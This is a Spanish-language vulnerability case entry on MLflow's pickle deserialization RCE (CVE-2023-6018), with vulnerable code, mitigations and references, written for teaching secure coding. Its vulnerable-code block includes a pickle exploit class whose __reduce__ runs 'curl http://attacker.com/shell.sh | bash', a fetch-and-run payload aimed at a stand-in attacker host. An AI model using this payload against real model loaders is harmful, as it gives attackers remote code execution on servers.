# Case: RCE via pickle en MLflow (CVE-2023-6018)

## CVE

CVE-2023-6018

## CWE asociado

CWE-502

## Descripción

MLflow antes de 2.8.1 era vulnerable a RCE cuando un modelo guardado con pickle contenía código malicioso. Al cargar un modelo (vía `mlflow.pyfunc.load_model()`), el pickle se deserializaba ejecutando código arbitrario en el servidor.

## Código vulnerable

```python
import mlflow

# Servidor carga modelo de fuente no confiable
model = mlflow.pyfunc.load_model("models:/user-uploaded-model/1")
# ↑ Si el modelo fue guardado con pickle malicioso → RCE

# El modelo malicioso se crea así:
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("curl http://attacker.com/shell.sh | bash",))
```

## Código corregido

```python
import mlflow

# Opción 1: Solo cargar modelos de fuentes verificadas con firma
model_info = mlflow.models.get_model_version("model-name", version=1)
if not verify_model_signature(model_info):
    raise SecurityError("Model signature verification failed")

# Opción 2: Usar formatos seguros (ONNX, SavedModel) en lugar de pickle
model = mlflow.onnx.load_model("models:/verified-model/1")

# Opción 3: Sandboxing (ejecutar en container aislado)
# MLflow 2.8.1+ añadió restricciones sobre qué se puede deserializar
```

## Contexto

MLflow es una plataforma de ML ampliamente usada. Muchos frameworks ML (scikit-learn, PyTorch) serializan modelos con pickle por defecto. Un modelo "compartido" en un registry podía contener payloads que se ejecutaban al cargarse en producción.

## Referencia

- https://nvd.nist.gov/vuln/detail/CVE-2023-6018
- https://github.com/mlflow/mlflow/security/advisories/GHSA-9rgf-cv5q-3qq5
